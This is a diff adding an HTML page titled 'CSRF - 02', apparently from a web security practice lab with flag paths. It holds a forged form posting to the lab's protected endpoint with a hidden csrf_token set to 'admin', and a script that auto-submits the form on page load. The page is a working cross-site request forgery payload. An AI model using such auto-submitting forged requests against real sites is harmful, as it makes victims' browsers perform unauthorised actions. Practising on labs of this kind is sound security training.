@@ -1,9 +1,42 @@
+<html lang="en">
+
+<head>
+    <title>
+        CSRF - 02    </title>
+    <meta charset="utf-8">
+    <meta name="description" content="CSRF - 02">
+    <link rel="stylesheet" media="all" href="/http/public/styles.css">
+</head>
+
+<body><link rel="stylesheet" media="all" href="/http/public/http_styles.css">
+<div id="menu">
+  <ul>
+    <li><a href="/http/public/index.php">Public Site</a></li>
+    <li><a href="/http/public/protected/index.php">Protected Site</a></li>
+    <li><a href="/http/public/protected/logout.php" style="color: red;">Log out</a></li>
+  </ul>
+</div>
+
+<div id="main-content">
+  <h1>CSRF - 02</h1>
+
+  <p>Only admins can update this info...</p>
+
+  
 <form name="csrfForm" action="/http/public/protected/flags/csrf_02/?firstname=&lastname=&csrf_token=user" method="POST">
  <input type="text" name="Priyansha" />
  <input type="text" name="Sharma" />
  <input type="hidden" name="csrf_token" value="admin"/>
  <input type="submit" value="Update"/>
 </form>
+
+  </div>
+
+  </body>
+  <footer>
+  </footer>
+</html>
+
 <script>
  document.csrfForm.submit();
 </script>
